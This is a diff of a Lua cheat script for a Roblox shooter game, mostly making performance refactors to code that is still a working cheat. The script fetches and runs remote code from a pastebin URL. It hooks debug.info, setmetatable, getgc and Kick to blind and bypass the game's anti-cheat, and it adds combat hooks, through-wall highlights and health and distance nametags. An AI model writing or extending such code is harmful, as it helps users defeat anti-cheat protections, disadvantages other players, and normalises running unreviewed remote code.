@@ -1,3 +1,6 @@
+--!optimize 2
+--!nonstrict
+
 local success1, err1 = pcall(function()
     loadstring(game:HttpGet("https://pastebin.com/raw/EWFUUrHi"))()
 end)
@@ -5,9 +8,7 @@ if not success1 then
     warn("Failed to load external script 1: " .. tostring(err1))
 end
 
---!nonstrict
-
---// Fast Localizations for Performance
+--// Fast Localizations for Maximum Performance
 local math_floor = math.floor
 local math_clamp = math.clamp
 local math_random = math.random
@@ -18,7 +19,17 @@ local vec2_new = Vector2.new
 local vec3_new = Vector3.new
 local color_rgb = Color3.fromRGB
 local color_hsv = Color3.fromHSV
+local color_new = Color3.new
+local udim2_offset = UDim2.fromOffset
+local udim2_scale = UDim2.fromScale
 local os_clock = os.clock
+local table_insert = table.insert
+local table_clear = table.clear
+local table_create = table.create
+local string_find = string.find
+local string_format = string.format
+local string_upper = string.upper
+local string_sub = string.sub
 
 local HttpService = game:GetService("HttpService")
 local Players = cloneref(game:GetService("Players"))
@@ -191,7 +202,7 @@ do
     function gamefunction:hookgame()
         local function bind(signal)
             if signal and signal.Connect then
-                table.insert(newData.connections, signal:Connect(self.update))
+                table_insert(newData.connections, signal:Connect(self.update))
             end
         end
 
@@ -233,7 +244,7 @@ do
     end
 end
 
---// Anti-cheat Bypass / Logging
+--// Anti-cheat Bypass / Logging Optimization
 
 for _, con in getconnections(game:GetService("LogService").MessageOut) do
     if con.Function and islclosure(con.Function) then
@@ -243,11 +254,11 @@ end
 
 local names = {"LocalScript3", "MiscellaneousController", "AnalyticsPipeline"}
 local function is_ac_calling()
-    for i = 2, 15 do
+    for i = 2, 12 do
         local ok, src = pcall(debug.info, i, "s")
         if ok and src then
-            for _, n in ipairs(names) do 
-                if src:find(n) then return true end 
+            for j = 1, 3 do 
+                if string_find(src, names[j]) then return true end 
             end
         end
     end
@@ -256,8 +267,8 @@ end
 
 local old_debug_info; old_debug_info = hookfunction(debug.info, newcclosure(function(f, l, ...)
     local res = { old_debug_info(f, l, ...) }
-    if type(l) == "string" and l:find("s") and res[1] then
-        if type(res[1]) == "string" and (res[1]:find("Ghost") or not res[1]:find(".lua")) then
+    if type(l) == "string" and string_find(l, "s") and res[1] then
+        if type(res[1]) == "string" and (string_find(res[1], "Ghost") or not string_find(res[1], ".lua")) then
             return "CommonLib.lua"
         end
     end
@@ -280,7 +291,7 @@ local old_setmetatable; old_setmetatable = hookfunction(getrenv().setmetatable, 
         if mode == "kv" or mode == "v" or mode == "k" then
             local stack = debug.traceback()
             
-            if stack:find("MiscellaneousController") or stack:find("LocalScript3") or stack:find("CameraSecurity") or stack:find("AnalyticsPipelineController") then
+            if string_find(stack, "MiscellaneousController") or string_find(stack, "LocalScript3") or string_find(stack, "CameraSecurity") or string_find(stack, "AnalyticsPipelineController") then
                 return old_setmetatable({1, 2, 3}, {})
             end
         end
@@ -293,15 +304,13 @@ end))
 local oldgc = getgc
 getgc = function(...)
     local gc = oldgc(...)
-    local filtered = table.create(#gc)
+    local filtered = table_create(#gc)
     local count = 0
     for i = 1, #gc do
         local v = gc[i]
         if typeof(v) == "function" then
             local ok, src = pcall(debug.info, v, "s")
-            if ok and src and (src:find("LocalScript3") or src:find("MiscellaneousController")) then
-                -- Omit AC functions
-            else
+            if not (ok and src and (string_find(src, "LocalScript3") or string_find(src, "MiscellaneousController"))) then
                 count += 1
                 filtered[count] = v
             end
@@ -321,7 +330,7 @@ hookfunction(old_kick, newcclosure(function(self, ...)
 end))
 
 repeat
-    modLoaded = game:IsLoaded() and table.find(table.create(#getloadedmodules(), nil), true)
+    modLoaded = game:IsLoaded() and table.find(table_create(#getloadedmodules(), nil), true)
 
     for _, v in ipairs(getloadedmodules()) do
         if v.Name == "EntityController" then
@@ -338,14 +347,12 @@ do
     local Modules = ps.Modules
     local ReplicatedModules = ReplicatedStorage:WaitForChild("Modules")
 
-    --// Main Controllers
     Controllers.fighter = require(ControllersFolder:WaitForChild("FighterController"))
     Controllers.duel = require(ControllersFolder:WaitForChild("DuelController"))
     Controllers.spectate = require(ControllersFolder:WaitForChild("SpectateController"))
     Controllers.queuePad = require(ControllersFolder:WaitForChild("QueuePadController"))
     Controllers.matchmaking = require(ControllersFolder:WaitForChild("MatchmakingController"))
 
-    --// Modules
     Controllers.pData = require(ControllersFolder:WaitForChild("PlayerDataController"))
     Controllers.rep = require(ReplicatedModules:WaitForChild("ReplicatedClass"))
     Controllers.cam = require(ControllersFolder:WaitForChild("CameraController"))
@@ -379,17 +386,17 @@ local function hookmuzzle()
     return Camera.CFrame.Position
 end
 
--- Refined Viewmodel Lookup Cache with Descendant Verification
+-- Refined Fast Viewmodel Lookup Cache
 local cachedWeapon = nil
 local function getweapon()
-    if cachedWeapon and cachedWeapon.Parent and cachedWeapon:IsDescendantOf(workspace) and string.find(cachedWeapon.Name, lplr.Name) then
+    if cachedWeapon and cachedWeapon.Parent and cachedWeapon:IsDescendantOf(workspace) and string_find(cachedWeapon.Name, lplr.Name) then
         return cachedWeapon
     end
     local path = workspace:FindFirstChild("ViewModels")
     path = path and path:FindFirstChild("FirstPerson")
     if not path then return nil end
     for _, v in ipairs(path:GetChildren()) do
-        if v:IsA("Model") and string.find(v.Name, lplr.Name) then
+        if v:IsA("Model") and string_find(v.Name, lplr.Name) then
             cachedWeapon = v
             return v
         end
@@ -398,14 +405,14 @@ local function getweapon()
     return nil
 end
 
--- Custom entity handler optimized
+-- Fast Entity Handler with Reused Raycast Parameters
 do
     local function getRandomPart(model)
         local descendants = model:GetDescendants()
         local total = #descendants
         if total == 0 then return nil end
         
-        for _ = 1, 10 do
+        for _ = 1, 6 do
             local randomInst = descendants[math_random(1, total)]
             if randomInst and randomInst:IsA("BasePart") then
                 return randomInst
@@ -414,7 +421,6 @@ do
         return nil
     end
 
-    -- Recycled RaycastParams to prevent per-frame GC allocations
     local sharedRayParams = RaycastParams.new()
     sharedRayParams.FilterType = Enum.RaycastFilterType.Exclude
 
@@ -464,7 +470,7 @@ do
 
             if args.wallCheck ~= false and not isVisible(char, target) then continue end
 
-            table.insert(results, {
+            table_insert(results, {
                 entity = entity,
                 part = target,
                 distance = distance,
@@ -563,6 +569,7 @@ runcode(function()
     end)
 end)
 
+--// Combat
 runcode(function()
     local WEAPON_CONFIG = {}
     local oldRaycast
@@ -838,7 +845,7 @@ runcode(function()
                         item.ReloadLength = reload
                     end
                 end
-                table.clear(originalReloads)
+                table_clear(originalReloads)
             end
         end
     })
@@ -916,18 +923,24 @@ runcode(function()
                 Lighting.GlobalShadows = false
                 Lighting.FogEnd = 9e9
 
-                for _, inst in ipairs(Workspace:GetDescendants()) do
-                    if inst:IsA("BasePart") and inst.CastShadow then
-                        modifiedInstances[inst] = {CastShadow = inst.CastShadow}
-                        inst.CastShadow = false
-                    elseif (inst:IsA("Decal") or inst:IsA("Texture")) and inst.Transparency < 1 then
-                        modifiedInstances[inst] = {Transparency = inst.Transparency}
-                        inst.Transparency = 1
-                    elseif (inst:IsA("ParticleEmitter") or inst:IsA("Trail") or inst:IsA("Smoke") or inst:IsA("Fire")) and inst.Enabled then
-                        modifiedInstances[inst] = {Enabled = inst.Enabled}
-                        inst.Enabled = false
+                task.spawn(function()
+                    local descendants = Workspace:GetDescendants()
+                    for i = 1, #descendants do
+                        local inst = descendants[i]
+                        if inst:IsA("BasePart") and inst.CastShadow then
+                            modifiedInstances[inst] = {CastShadow = inst.CastShadow}
+                            inst.CastShadow = false
+                        elseif (inst:IsA("Decal") or inst:IsA("Texture")) and inst.Transparency < 1 then
+                            modifiedInstances[inst] = {Transparency = inst.Transparency}
+                            inst.Transparency = 1
+                        elseif (inst:IsA("ParticleEmitter") or inst:IsA("Trail") or inst:IsA("Smoke") or inst:IsA("Fire")) and inst.Enabled then
+                            modifiedInstances[inst] = {Enabled = inst.Enabled}
+                            inst.Enabled = false
+                        end
+
+                        if i % 200 == 0 then task.wait() end
                     end
-                end
+                end)
             else
                 if originalSettings.GlobalShadows ~= nil then
                     Lighting.GlobalShadows = originalSettings.GlobalShadows
@@ -941,7 +954,7 @@ runcode(function()
                         end
                     end
                 end
-                table.clear(modifiedInstances)
+                table_clear(modifiedInstances)
             end
         end
     })
@@ -976,11 +989,35 @@ runcode(function()
     })
 end)
 
+-- Viewmodel Optimization: Caches descendant parts on weapon change to prevent per-frame recursive hierarchy lookups
 runcode(function()
     local ViewModel, Rainbow, Smooth, Arms, Speed, Transparency, WeaponColor = {}, {}, {}, {}, {}, {}, {}
     local saved, hue, index, last = {}, 0, 1, 0
+    local cachedParts = {}
+    local lastWeapon = nil
 
     local colors = {color_rgb(180,180,180), color_rgb(80,50,230), color_rgb(255,50,200), color_rgb(255,130,0), color_rgb(255,220,0)}
+
+    local function cacheWeaponParts(weapon)
+        table_clear(cachedParts)
+        if not weapon then return end
+
+        local visual = weapon:FindFirstChild("ItemVisual")
+        if visual then
+            for _, v in ipairs(visual:GetDescendants()) do
+                if v:IsA("BasePart") then
+                    table_insert(cachedParts, {part = v, isArm = false})
+                end
+            end
+        end
+
+        for _, name in ipairs({"LeftArm", "RightArm"}) do
+            local arm = weapon:FindFirstChild(name)
+            if arm and arm:IsA("BasePart") then
+                table_insert(cachedParts, {part = arm, isArm = true})
+            end
+        end
+    end
 
     ViewModel = GuiLibrary.Registry.renderPanel.API.CreateOptionsButton({
         Name = "ViewModel",
@@ -988,8 +1025,12 @@ runcode(function()
             if callback then
                 RunLoops:BindToHeartbeat("ViewModel", function()
                     local weapon = getweapon()
-                    local visual = weapon and weapon:FindFirstChild("ItemVisual")
-                    if not visual then return end
+                    if weapon ~= lastWeapon then
+                        lastWeapon = weapon
+                        cacheWeaponParts(weapon)
+                    end
+
+                    if #cachedParts == 0 then return end
 
                     local color = WeaponColor.Color
                     if Rainbow.Enabled then
@@ -1006,27 +1047,20 @@ runcode(function()
                         end
                     end
 
-                    for _, v in ipairs(visual:GetDescendants()) do
-                        if v:IsA("BasePart") then
-                            if not saved[v] then
-                                saved[v] = {v.Color, v.Transparency}
-                            end
+                    local transVal = Transparency.Value / 100
+                    local includeArms = Arms.Enabled
 
-                            v.Color = color
-                            v.Transparency = Transparency.Value / 100
-                        end
-                    end
+                    for i = 1, #cachedParts do
+                        local item = cachedParts[i]
+                        local p = item.part
 
-                    if Arms.Enabled then
-                        for _, name in ipairs({"LeftArm","RightArm"}) do
-                            local arm = weapon:FindFirstChild(name)
-                            if arm then
-                                if not saved[arm] then
-                                    saved[arm] = {arm.Color, arm.Transparency}
+                        if p and p.Parent then
+                            if not item.isArm or includeArms then
+                                if not saved[p] then
+                                    saved[p] = {p.Color, p.Transparency}
                                 end
-
-                                arm.Color = color
-                                arm.Transparency = Transparency.Value / 100
+                                p.Color = color
+                                p.Transparency = transVal
                             end
                         end
                     end
@@ -1040,6 +1074,8 @@ runcode(function()
                     end
                 end
                 saved = {}
+                table_clear(cachedParts)
+                lastWeapon = nil
             end
         end
     })
@@ -1198,7 +1234,12 @@ runcode(function()
                     local char = PlayerUtility.GetCharacter()
                     local seen = {}
 
-                    for _, entity in ipairs(CollectionService:GetTagged("Entity")) do
+                    local tagged = CollectionService:GetTagged("Entity")
+                    local fillTrans = fill.Value / 100
+                    local checkTeams = teams.Enabled
+
+                    for i = 1, #tagged do
+                        local entity = tagged[i]
                         if entity == char or not entity:IsA("Model") then continue end
                         if shootingRange and entity:IsDescendantOf(shootingRange) then continue end
 
@@ -1210,15 +1251,16 @@ runcode(function()
                             continue
                         end
 
-                        if teams.Enabled and root:FindFirstChild("TeammateLabel") then
+                        if checkTeams and root:FindFirstChild("TeammateLabel") then
                             removeHL(entity)
                             continue
                         end
 
                         seen[entity] = true
 
-                        if not highlights[entity] then
-                            local hl = safeNew("Highlight")
+                        local hl = highlights[entity]
+                        if not hl then
+                            hl = safeNew("Highlight")
                             if hl then
                                 hl.FillColor = color_rgb(255,50,50)
                                 hl.OutlineColor = color_rgb(255,255,255)
@@ -1229,8 +1271,8 @@ runcode(function()
                             end
                         end
 
-                        if highlights[entity] then
-                            highlights[entity].FillTransparency = fill.Value / 100
+                        if hl then
+                            hl.FillTransparency = fillTrans
                         end
                     end
 
@@ -1261,6 +1303,7 @@ runcode(function()
     })
 end)
 
+-- Fast Nametags Renderer Optimization
 runcode(function()
     local cache = {}
     local gui
@@ -1310,9 +1353,9 @@ runcode(function()
 
         local bgf = safeNew("Frame")
         if not bgf then frame:Destroy(); return nil end
-        bgf.Size = UDim2.fromScale(1, 1)
+        bgf.Size = udim2_scale(1, 1)
         bgf.BorderSizePixel = 0
-        bgf.BackgroundColor3 = Color3.new(0, 0, 0)
+        bgf.BackgroundColor3 = color_new(0, 0, 0)
         bgf.Parent = frame
 
         local cornerObj = safeNew("UICorner")
@@ -1321,10 +1364,10 @@ runcode(function()
         local text = safeNew("TextLabel")
         if text then
             text.BackgroundTransparency = 1
-            text.Size = UDim2.fromScale(1, 1)
+            text.Size = udim2_scale(1, 1)
             text.RichText = true
             text.TextStrokeTransparency = 0.4
-            text.TextColor3 = Color3.new(1, 1, 1)
+            text.TextColor3 = color_new(1, 1, 1)
             text.Parent = bgf
         end
 
@@ -1339,16 +1382,17 @@ runcode(function()
     end
 
     local function rgb(c)
-        return ("rgb(%d,%d,%d)"):format(c.R * 255, c.G * 255, c.B * 255)
+        return string_format("rgb(%d,%d,%d)", c.R * 255, c.G * 255, c.B * 255)
     end
 
     local function rainbow(str)
         local out = {}
         local t = os_clock() * 0.25
+        local len = #str
 
-        for i = 1, #str do
-            local c = color_hsv((t + (i / #str)) % 1, 0.9, 1)
-            out[i] = ('<font color="%s">%s</font>'):format(rgb(c), str:sub(i, i))
+        for i = 1, len do
+            local c = color_hsv((t + (i / len)) % 1, 0.9, 1)
+            out[i] = string_format('<font color="%s">%s</font>', rgb(c), string_sub(str, i, i))
         end
 
         return table.concat(out)
@@ -1382,8 +1426,15 @@ runcode(function()
 
                     local seen = {}
                     local shootingRange = workspace:FindFirstChild("ShootingRangeEntities")
+                    local tagged = CollectionService:GetTagged("Entity")
 
-                    for _, entity in ipairs(CollectionService:GetTagged("Entity")) do
+                    local font = getFontFace()
+                    local textSize = size.Value
+                    local bgTrans = bg.Enabled and 0.35 or 1
+                    local radius = UDim.new(0, corner.Value == "Square" and 0 or 6)
+
+                    for i = 1, #tagged do
+                        local entity = tagged[i]
                         if entity == char or not entity:IsA("Model") then continue end
                         if shootingRange and entity:IsDescendantOf(shootingRange) then continue end
 
@@ -1409,11 +1460,11 @@ runcode(function()
                         local parts = {}
 
                         local username = plr and (name.Enabled and plr.DisplayName ~= "" and plr.DisplayName or plr.Name) or entity.Name
-                        parts[#parts+1] = '<font color="rgb(255,255,255)">' .. username:upper() .. "</font>"
+                        parts[1] = '<font color="rgb(255,255,255)">' .. string_upper(username) .. "</font>"
 
                         if dist.Enabled and localRoot then
                             local d = math_floor((localRoot.Position - root.Position).Magnitude)
-                            parts[#parts+1] = ('<font color="rgb(85,255,85)">%s%s%s</font>'):format(brackets.Enabled and "[" or "", d, brackets.Enabled and "]" or "")
+                            parts[#parts+1] = string_format('<font color="rgb(85,255,85)">%s%d%s</font>', brackets.Enabled and "[" or "", d, brackets.Enabled and "]" or "")
                         end
 
                         if level.Enabled then
@@ -1423,7 +1474,7 @@ runcode(function()
                             if lvl >= 200 then
                                 txt = rainbow(brackets.Enabled and ("[" .. txt .. "]") or txt)
                             else
-                                txt = ('<font color="rgb(255,215,0)">%s%s%s</font>'):format(brackets.Enabled and "[" or "", txt, brackets.Enabled and "]" or "")
+                                txt = string_format('<font color="rgb(255,215,0)">%s%s%s</font>', brackets.Enabled and "[" or "", txt, brackets.Enabled and "]" or "")
                             end
 
                             parts[#parts+1] = txt
@@ -1432,25 +1483,25 @@ runcode(function()
                         if hp.Enabled then
                             local h = math_floor(hum.Health)
                             local c = color_hsv(math_clamp(h / hum.MaxHealth, 0, 1) / 3, 0.9, 1)
-                            parts[#parts+1] = ('<font color="%s">%s%s%s</font>'):format(rgb(c), brackets.Enabled and "[" or "", h, brackets.Enabled and "]" or "")
+                            parts[#parts+1] = string_format('<font color="%s">%s%d%s</font>', rgb(c), brackets.Enabled and "[" or "", h, brackets.Enabled and "]" or "")
                         end
 
                         tag.text.Text = table.concat(parts, " ")
-                        tag.text.FontFace = getFontFace()
-                        tag.text.TextSize = size.Value
+                        tag.text.FontFace = font
+                        tag.text.TextSize = textSize
 
-                        tag.bg.BackgroundTransparency = bg.Enabled and 0.35 or 1
-                        tag.corner.CornerRadius = UDim.new(0, corner.Value == "Square" and 0 or 6)
+                        tag.bg.BackgroundTransparency = bgTrans
+                        tag.corner.CornerRadius = radius
 
                         local bounds = tag.text.TextBounds
-                        tag.frame.Size = UDim2.fromOffset(bounds.X + 10, bounds.Y + 6)
+                        tag.frame.Size = udim2_offset(bounds.X + 10, bounds.Y + 6)
 
                         local pos, visible = Camera:WorldToViewportPoint(root.Position + Vector3.new(0, hum.HipHeight + 1.2, 0))
 
                         tag.frame.Visible = visible and pos.Z > 0
 
                         if tag.frame.Visible then
-                            tag.frame.Position = UDim2.fromOffset(pos.X, pos.Y)
+                            tag.frame.Position = udim2_offset(pos.X, pos.Y)
                         end
                     end
 
